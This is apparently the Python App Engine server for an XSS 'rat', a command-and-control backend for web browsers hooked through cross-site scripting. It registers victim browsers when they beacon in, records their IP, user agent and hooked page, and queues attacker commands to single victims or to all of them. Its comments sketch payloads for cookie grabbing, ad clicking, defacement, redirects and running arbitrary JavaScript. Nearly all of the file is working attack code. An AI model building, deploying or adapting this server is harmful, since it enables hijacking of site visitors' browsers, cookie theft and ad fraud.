#!/usr/bin/env python
#
# Copyright 2007 Google Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
import logging
import webapp2
import jinja2
import os
import uuid
import json

template_dir = os.path.join(os.path.dirname(__file__), 'templates')
jinja_environment = jinja2.Environment(
    loader=jinja2.FileSystemLoader(template_dir), autoescape=True)

from google.appengine.api import memcache
from google.appengine.ext import db
from google.appengine.api import users

from datetime import datetime
from collections import OrderedDict

class BaseHandler(webapp2.RequestHandler):
    def write(self, *a, **kw):
        self.response.out.write(*a,**kw)

    def render_str(self, template, params):
        t = jinja_environment.get_template(template)

        if self.adminCheck():
            params['admin'] = True;

        return t.render(params)

    def render(self, template, kw):
        self.write(self.render_str(template, kw))

    def adminCheck(self):
        user = users.get_current_user()
        if user:
            if users.is_current_user_admin():
                return True;
            else:
                return False
        else:
            return False


# The MainHandler is basically the only html rendering piece on the server side.
# The rest of the app will be exposed as a RESTful API and a thick client application

class MainHandler(BaseHandler):
    def get(self):
        if self.adminCheck():
            template_values = {}
            self.render('dashboard.html',template_values)
        else:
            self.redirect(users.create_login_url(self.request.uri))



class TestHandler(BaseHandler):
    def get(self):
        template_values = {}
        self.render('test.html',template_values)


"""
TODO:

Nodes will be updated when:
a. they are edited from the attackers client side app
b. they have a command added to them
c. they have a command removed from them
d. Every beacon with a last updated timestamp

d. Happens very often and could be a large bottleneck. Perhaps timestamps should be stored in their own
memcache entry and the nodes should be updated for online/offline whenever the attackers getAllNodes api
call comes in. (every 30 seconds)

1. Whenever a node is updated. Set the individual memcache entry to the new edited node
2. Then grab all nodes, find that node within the list, change it, and reset the memcache entry

"""


# Data Structures
def createNode(req):
    nodes = getAllNodes()
    node = Node(req)
    memcache.set(node.cid,node)    # make the individual cache entry
    nodes.append(node.cid)
    memcache.set('nodes',nodes)    # make the list of nodes cache
    return node

class Node():
    def __init__(self,req):
        self.cid = str(uuid.uuid4())[:8]
        self.addr = req.remote_addr
        self.name = self.addr
        self.startTime = datetime.now()
        self.online = True
        self.lastCheckIn = 0
        self.afkDuration = 0
        self.afk = False
        self.userAgent = req.headers['User-Agent']
        self.hookPage = req.headers['Referer']

        self.commandQueue = OrderedDict()
        self.notes = list()

    def getNextCommand(self):
        logging.info("get next command")
        logging.info(len(self.commandQueue))
        if(len(self.commandQueue) > 0):
            command = self.commandQueue.items()[0][1]
            return command
        else:
            return None

    def completeCommand(self,commandID):
        logging.info("complete command")
        if commandID in self.commandQueue:
            logging.info("command is in queue removing it")
            del self.commandQueue[commandID]
            self.updateNode()
            return True
        else:
            logging.info("command not found")
            return False

    def addCommand(self,command):
        self.commandQueue[command.id] = command
        self.updateNode()

    def updateNode(self,updates=None):
        """
        updates is a dictionary that contains attributes to be updated
        below is an example

        updates = {
            "name": "Eric Cartmenez",
            "online": False,
            "userAgent": "some shit browser"
        }

        TODO: UPDATE THE TIMESTAMP FOR LAST UPDATE

        """

        logging.info("editing this node")
        if updates is not None:
            for key in updates:
                setattr(self,key,updates[key])
        memcache.set(self.cid,self)


def createCommand(request,autoComplete=False):
    commandType = request.get('type')
    commandList = request.POST.items()
    commandData = []
    if len(commandList) > 3:
        for command in commandList:
            if(command[0] == 'type' or command[0] == 'target'):
                continue
            commandData.append(command[1])
    else:
        commandData = request.get('command')
    return Command([commandType, commandData],autoComplete)

class Command():
    def __init__(self,commandData,autoComplete=False):
        newid = str(uuid.uuid4())[:18]
        newid = newid.replace('-','')
        self.id = newid
        self.data = commandData
        self.autoComplete = autoComplete
        logging.info("new command created")



# Victim Client-Facing code


class JSONResponse():
    @staticmethod
    def assignment(cid):
        # return json indicating an assignment of cid to the client
        jsres = {
            "type": "cidAssign",
            "data": {
                "cid": cid
            }
        }

        return json.dumps(jsres)

    @staticmethod
    def execCommand(command):
        #return json giving the client a new command to do
        jsres = {
            "type": "command",
            "commandID": command.id,
            "command": command.data
        }
        return json.dumps(jsres)

    @staticmethod
    def test():
        jsres = {
            "type": "somethingElse",
            "data": "nothing"
        }
        return json.dumps(jsres)



class BeaconHandler(BaseHandler):
    def get(self):
        """
        When a beacon comes in, see if that node already exists with the unique cookie
        If it does, then update the node saying it's online and the last check in time.

        If there is no existing node, then create a new one using a uuid as the cookie id.
        """

        self.response.headers['Access-Control-Allow-Origin'] = '*'  # Required until JSONP is supported
        self.response.headers['Content-Type'] = 'application/json'  # All responses are json, so JSONP to come

        if(self.request.get("cid")):
            cid = self.request.get("cid")
            node = memcache.get(cid)

            if node is not None:
                # if it is a valid cid then check to see if there are any commands
                # in the nodes command queue
                # and update some fields on the node

                command = node.getNextCommand()
                if command is not None:
                    self.write(JSONResponse.execCommand(command))
                    if command.autoComplete is True:
                        logging.info("auto completing")
                        node.completeCommand(command.id)
                else:
                    self.write(json.dumps({"type":"noCommand"}))
            else:
                # if it turned out to be a non valid cid, just make a new node
                node = createNode(self.request)
                self.write(JSONResponse.assignment(node.cid))
                

        else: # if the request had no cid attached
            node = createNode(self.request)
            self.write(JSONResponse.assignment(node.cid))




def isValidCid(cid):
    node = memcache.get(cid)
    if node is not None:
        return True
    else:
        return False

def getAllNodes():
    nodes = memcache.get('nodes')
    if nodes is None:
        nodes = list()
        return nodes
    return list(nodes)

def setLastUpdate():
    lastupdate = memcache.get("lastupdate")


def nodesToJSON():
    nodes = getAllNodes()
    fulljson = {
        "lastupdate": "lastupdate"
    }
    jsonnodes = []
    for nodecid in nodes:
        node = memcache.get(nodecid)
        if node is not None:
            nodejson = {
                "cid": node.cid,
                "addr": node.addr,
                "name": node.name,
                "startTime": node.startTime.ctime(),
                "online": node.online,
                "afkDuration": node.afkDuration,
                "afk": node.afk,
                "userAgent": node.userAgent,
                "hookPage": node.hookPage,
                "notes": node.notes
            }
            jsonnodes.append(nodejson)
        else:
            continue

    fulljson["nodes"] = jsonnodes
    return json.dumps(fulljson)
    # return jsonnodes



# Attacker Client-Facing code

class GetAllNodesHandler(BaseHandler):
    """
    This API call should be made around once every 30 seconds from the attackers client
    """
    def get(self):
        self.response.headers['Content-Type'] = 'application/json' 
        self.write(nodesToJSON())


class AddCommandHandler(BaseHandler):
    def get(self):
        self.response.http_status_message(404)
    def post(self):
        logging.info(self.request.POST.items())
        targetID = self.request.get('target')
        target = memcache.get(targetID)
        autoComplete = self.request.get('ac')

        if targetID is None or target is None:
            # self.write(targetID)
            if targetID == "0":
                if autoComplete == 'yes':
                    command = createCommand(self.request,True)
                else:
                    command = createCommand(self.request)
                cids = memcache.get("nodes")
                for cid in cids:
                    node = memcache.get(cid)
                    node.addCommand(command)
                
                self.write(json.dumps(command.data))
        else:
            if autoComplete == 'yes':
                command = createCommand(self.request,True)
            else:
                command = createCommand(self.request)
            target.addCommand(command)
            self.write(json.dumps(command.data))





class UpdateNodeHandler(BaseHandler):
    def get(self):
        cid = self.request.get("cid")
        node = memcache.get(cid)
        updates = {
            "name": "Mr Eric Cartmenez",
            "userAgent": "thegoodchrome Browser 21.0"
        }
        node.updateNode(updates)
    def post(self):
        self.write("TODO: UPDATE NODES ON POST REQUEST")


class CompleteCommandHandler(BaseHandler):
    def get(self):
        self.write("There should be no get request on the complete command handler")
    def post(self):
        self.response.headers['Access-Control-Allow-Origin'] = '*'
        self.response.headers['Content-Type'] = 'application/json'

        cid = self.request.get('cid')
        commandID = self.request.get('command')
        result = self.request.get('result')

        node = memcache.get(cid)
        isComplete = node.completeCommand(commandID)

        resp = {
            "completed": False
        }

        if isComplete is True:
            resp = {
                "completed": True
            }
        

        self.write(json.dumps(resp))


class FlushHandler(BaseHandler):
    def get(self):
        self.write("this does nothing");
    def post(self):
        if(self.request.get("confirm") == "yes"):
            logging.info("trying to flush")
            memcache.flush_all()


app = webapp2.WSGIApplication([
    ('/', MainHandler),
    ('/test',TestHandler),
    ('/beacon',BeaconHandler),
    ('/getallnodes',GetAllNodesHandler), # Attacker Client API Methods
    ('/flushallnodes',FlushHandler), # Attacker Client API Methods
    ('/addcommand',AddCommandHandler), 
    ('/updatenode',UpdateNodeHandler),
    ('/completecommand',CompleteCommandHandler), # Victim API Methods
],
debug=True)





# what some of the commands might look like


# alert = {
#             "type": "command".
#             "commandID": command.id,
#             "command": ["Alert", "hey bitch what the fuck up"]
#         }

# alert2 = {
#             "type": "command".
#             "commandID": command.id,
#             "command": ["Alert2", "hey bitch what the fuck up"]
#         }

# AdClicker = {
#             "type": "command".
#             "commandID": command.id,
#             "command": ["Adclicker", 
#                 [ "http:www.thisisurl1.com",
#                   "http://www.thisisurl2.com",
#                   "http://www.thisisurl3.com" ]
#             ]
#         }

# CookieGrabber = {
#     "type": "command",
#     "commandID": command.id,
#     "command": ["CookieGrabber"]
# }

# deface = {
#             "type": "command".
#             "commandID": command.id,
#             "command": ["Deface", newHTML]
#         }

# playsound = {
#             "type": "command".
#             "commandID": command.id,
#             "command": ["Playsound", "http://xssrat.appspot.org/app/audio/soundfile1.mp3"]
#         }

# redirect = {
#         "type":"command",
#         "commandId", command.id,
#         "command": ["Redirect", newurl]
# }

# Shell = {
#             "type": "command".
#             "commandID": command.id,
#             "command": ["Shell", javascript]
#         }






